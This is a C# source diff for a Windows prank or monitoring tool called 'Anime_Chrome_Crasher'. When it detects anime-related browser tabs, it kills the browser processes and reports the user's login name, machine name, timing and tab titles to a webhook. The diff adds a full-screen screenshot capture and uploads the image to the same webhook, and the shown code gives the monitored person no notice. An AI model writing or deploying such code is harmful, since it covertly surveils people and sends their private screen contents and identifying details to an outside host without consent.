@@ -4,6 +4,7 @@ using System.Windows.Forms;
 using System.Windows.Automation;
 using System.Text.RegularExpressions;
 using Microsoft.Win32;
+using System.Drawing;
 
 namespace Anime_Chrome_Crasher
 {
@@ -69,34 +70,36 @@ namespace Anime_Chrome_Crasher
         {
             foreach (var process in Process.GetProcessesByName(windowname))
             {
-                try
-                {
-                    try
-                    {
-                        process.Kill();
-                    }
-                    catch (InvalidOperationException)
-                    {
-
-                    }
-                }
-                catch (System.ComponentModel.Win32Exception)
-                {
-
-                }
+                try { process.Kill(); } catch (Exception) { }
             }
         }
 
         public static void sendDetectionMessage(string tabs)
         {
+            screenShot();
             TimeSpan timeElapsed = DateTime.Now - startTime;
-            string timeDiff = "After approximately" + timeElapsed.Hours + " hours " + timeElapsed.Minutes + " minutes and "
-                + timeElapsed.Seconds + " seconds from the program starting anime was detected.";
-            WeebHook.SendMessage(timeDiff);
             WeebHook.SendMessage("WARNING WEEB DETECTED AT " + DateTime.Now.ToString());
+            string timeDiff = "After approximately " + timeElapsed.Hours + " hours " + timeElapsed.Minutes + " minutes and "
+                + timeElapsed.Seconds + " seconds from the program starting, anime was detected.";
+            WeebHook.SendMessage(timeDiff);
             WeebHook.SendMessage("The user " + Environment.UserName + " on the machine " + Environment.MachineName
-                + "has been detected looking at anime");
+                + " has been detected looking at anime.");
             WeebHook.SendMessage(tabs);
+            WeebHook.SendImage();
+            WeebHook.SendMessage("This is a screencap of the users primary screen at the time of the incident ");
+        }
+
+        public static void screenShot()
+        {
+            int resHeight = Screen.PrimaryScreen.Bounds.Height;
+            int resWidth = Screen.PrimaryScreen.Bounds.Width;
+            Bitmap bmpScreenshot = new Bitmap(resWidth, resHeight);
+            Size resSize = new Size(resWidth, resHeight);
+            using (var g = Graphics.FromImage(bmpScreenshot))
+            {
+                g.CopyFromScreen(0, 0, 0, 0, resSize);
+            }
+            bmpScreenshot.Save("Screenshot.png", System.Drawing.Imaging.ImageFormat.Png);
         }
     }
 
